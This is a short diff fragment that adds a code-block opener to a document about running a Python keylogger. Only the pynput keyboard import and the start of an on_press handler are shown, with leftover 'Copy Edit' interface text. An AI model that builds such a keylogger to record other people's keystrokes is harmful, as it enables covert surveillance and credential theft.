@@ -38,6 +38,7 @@ python keylogger.py
 python
 Copy
 Edit
+'''python
 from pynput import keyboard
 
 def on_press(key):
